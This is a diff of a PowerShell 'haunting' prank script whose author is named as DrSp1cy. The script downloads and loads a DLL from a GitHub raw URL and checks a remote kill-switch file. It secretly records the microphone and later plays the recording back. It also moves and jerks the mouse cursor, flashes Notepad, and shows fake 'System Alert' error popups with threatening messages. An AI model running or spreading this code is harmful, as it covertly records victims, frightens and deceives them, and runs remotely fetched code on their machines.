@@ -1,34 +1,35 @@
-# In-memory Haunting Script with Remote Kill Switch – by DrSp1cy
-
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 Add-Type -AssemblyName PresentationFramework
 
+# === Logger Setup ===
 $log = "$env:TEMP\haunt_debug.log"
 "[$(Get-Date)] Starting Haunt" | Out-File $log -Append
+function Log { param([string]$msg) "[$(Get-Date)] $msg" | Out-File $log -Append }
 
-function Log {
-    param([string]$msg)
-    "[$(Get-Date)] $msg" | Out-File $log -Append
-}
-
-# Try to load NAudio in-memory
-$naudioUrl = "https://raw.githubusercontent.com/DrSp1cy/Haunt/refs/heads/main/NAudio.dll"
+# === Kill Switch Check ===
+$killURL = "https://raw.githubusercontent.com/DrSp1cy/Haunt/refs/heads/main/kill.txt"
 try {
-    Log "Downloading NAudio"
-    $naudioBytes = Invoke-WebRequest $naudioUrl -UseBasicParsing
-    $assembly = [System.Reflection.Assembly]::Load($naudioBytes.Content)
+    $status = (Invoke-WebRequest $killURL -UseBasicParsing).StatusCode
+    if ($status -ne 200) { Log "Kill switch active. Exiting."; exit }
+} catch { Log "Kill check failed. Assuming kill. Exiting."; exit }
+
+# === NAudio Disk Load (fixed) ===
+$naudioPath = "$env:TEMP\NAudio.dll"
+try {
+    Invoke-WebRequest "https://raw.githubusercontent.com/DrSp1cy/Haunt/refs/heads/main/NAudio.dll" -OutFile $naudioPath -UseBasicParsing
+    Add-Type -Path $naudioPath
     $audioOK = $true
-    Log "NAudio loaded"
+    Log "NAudio loaded from disk"
 } catch {
     $audioOK = $false
-    Log "NAudio FAILED to load: $_"
+    Log "NAudio load FAILED: $_"
 }
 
+# === Audio Recording Setup ===
 $waveIn = $null
 $writer = $null
 $waveFile = "$env:TEMP\ghost_record.wav"
-
 if ($audioOK) {
     try {
         $waveIn = New-Object NAudio.Wave.WaveInEvent
@@ -40,56 +41,69 @@ if ($audioOK) {
         $waveIn.StartRecording()
         Log "Recording started"
     } catch {
-        Log "Audio recording setup failed: $_"
         $audioOK = $false
+        Log "Audio setup FAILED: $_"
     }
 }
 
-# BEGIN LOOP
+# === Main Loop ===
 while ($true) {
     try {
-        $status = (Invoke-WebRequest "https://raw.githubusercontent.com/DrSp1cy/Haunt/refs/heads/main/kill.txt" -UseBasicParsing).StatusCode
-        if ($status -ne 200) { break }
-    } catch { break }
+        $status = (Invoke-WebRequest $killURL -UseBasicParsing).StatusCode
+        if ($status -ne 200) { Log "Kill switch triggered. Exiting."; break }
+    } catch {
+        Log "Kill check error. Assuming kill."; break
+    }
 
     Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 25)
 
-    $pos = [System.Windows.Forms.Cursor]::Position
-    $x = [int]$pos.X
-    $y = [int]$pos.Y
-    $dx = Get-Random -Minimum -20 -Maximum 20
-    $dy = Get-Random -Minimum -20 -Maximum 20
-    $newX = $x + $dx
-    $newY = $y + $dy
+    # === Mouse Movement (safe)
     try {
+        $pos = [System.Windows.Forms.Cursor]::Position
+        $x = [int]$pos.X
+        $y = [int]$pos.Y
+        $dx = Get-Random -Minimum -30 -Maximum 30
+        $dy = Get-Random -Minimum -30 -Maximum 30
+        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+        $newX = [Math]::Min([Math]::Max(0, $x + $dx), $screen.Width - 1)
+        $newY = [Math]::Min([Math]::Max(0, $y + $dy), $screen.Height - 1)
         [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($newX, $newY)
         Log "Moved mouse to ($newX,$newY)"
     } catch {
         Log "Mouse move failed: $_"
     }
 
+    # === Snap to corner
     if ((Get-Random -Minimum 1 -Maximum 10) -eq 3) {
-        $original = [System.Windows.Forms.Cursor]::Position
-        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-        $corner = if ((Get-Random -Minimum 0 -Maximum 2) -eq 0) {
-            New-Object System.Drawing.Point(0, 0)
-        } else {
-            New-Object System.Drawing.Point($screen.Width - 1, $screen.Height - 1)
+        try {
+            $original = [System.Windows.Forms.Cursor]::Position
+            $corner = if ((Get-Random -Minimum 0 -Maximum 2) -eq 0) {
+                New-Object System.Drawing.Point(0, 0)
+            } else {
+                New-Object System.Drawing.Point($screen.Width - 1, $screen.Height - 1)
+            }
+            [System.Windows.Forms.Cursor]::Position = $corner
+            Start-Sleep -Milliseconds 300
+            [System.Windows.Forms.Cursor]::Position = $original
+            Log "Snap teleport executed"
+        } catch {
+            Log "Snap teleport failed: $_"
         }
-        [System.Windows.Forms.Cursor]::Position = $corner
-        Start-Sleep -Milliseconds 300
-        [System.Windows.Forms.Cursor]::Position = $original
-        Log "Snap teleport triggered"
     }
 
+    # === Notepad Flash
     if ((Get-Random -Minimum 1 -Maximum 30) -eq 7) {
-        Start-Process notepad
-        Start-Sleep -Seconds 1
-        Get-Process notepad | Stop-Process
-        Log "Notepad flashed"
+        try {
+            Start-Process notepad
+            Start-Sleep -Seconds 1
+            Get-Process notepad | Stop-Process
+            Log "Notepad opened & closed"
+        } catch {
+            Log "Notepad flash failed: $_"
+        }
     }
 
-    # Try playback if audio was OK
+    # === Audio Playback
     if ($audioOK -and (Get-Random -Minimum 1 -Maximum 25) -eq 5) {
         try {
             $waveIn.StopRecording(); $writer.Dispose()
@@ -103,20 +117,25 @@ while ($true) {
             }
             $writer = New-Object NAudio.Wave.WaveFileWriter $waveFile, $waveIn.WaveFormat
             $waveIn.StartRecording()
-            Log "Audio playback triggered"
+            Log "Audio playback successful"
         } catch {
-            Log "Audio playback failed: $_"
+            Log "Audio playback FAILED: $_"
         }
     }
 
+    # === Creepy Popup
     if ((Get-Random -Minimum 1 -Maximum 15) -eq 6) {
-        $msg = Get-Random -InputObject @(
+        $msg = Get-Random @(
             "I know what you did.",
             "They're watching.",
             "Stop looking behind you.",
             "This isn't your computer anymore."
         )
-        [System.Windows.MessageBox]::Show($msg, "System Alert", "OK", "Error")
-        Log "MessageBox displayed: $msg"
+        try {
+            [System.Windows.MessageBox]::Show($msg, "System Alert", "OK", "Error")
+            Log "Popup displayed: $msg"
+        } catch {
+            Log "Popup display failed: $_"
+        }
     }
 }
